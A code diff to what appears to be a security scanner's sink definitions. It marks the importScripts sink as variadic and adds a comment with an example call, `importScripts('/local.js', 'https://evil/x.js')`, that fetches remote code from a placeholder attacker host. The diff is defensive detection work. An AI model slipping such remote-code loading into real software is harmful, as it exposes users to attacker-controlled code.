@@ -66,11 +66,18 @@ export const DYNAMIC_CODE_SINKS: readonly SinkSpec[] = [
   },
 ];
 
-/** `importScripts` loading a REMOTE script — cross-origin CODE, not a string. */
+/**
+ * `importScripts` loading a REMOTE script — cross-origin CODE, not a string.
+ *
+ * VARIADIC: it loads every URL it is handed, so a same-origin first argument
+ * does not make the call safe — `importScripts('/local.js', 'https://evil/x.js')`
+ * fetches remote code. Each argument is judged.
+ */
 export const REMOTE_IMPORT_SCRIPTS_SINK: SinkSpec = {
   name: 'importScripts',
   label: 'external importScripts (remote code)',
   codeArgument: isRemoteUrl,
+  variadic: true,
 };
 
 /**
